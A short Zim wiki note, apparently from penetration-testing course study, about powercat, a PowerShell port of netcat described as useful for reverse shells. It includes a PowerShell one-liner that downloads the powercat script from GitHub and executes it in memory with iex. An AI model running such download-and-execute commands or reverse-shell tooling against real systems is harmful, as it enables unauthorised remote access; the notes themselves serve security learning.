@@ -1,0 +1,19 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-19T13:33:48-04:00
+
+====== powercat ======
+Created Tuesday 19 May 2020
+
+
+its enables the netcat feature in powershell  for reverse shell
+
+**sudo apt-get install powercat**
+
+we can use the powercat function directly in
+PowerShell instead of executing the script each time.
+
+  ----PS C:\Users\Offsec>    . .\powercat.ps1
+cal also 
+---PS C:\Users\Offsec> iex (New-Object System.Net.Webclient).DownloadString('https://raw.
+githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
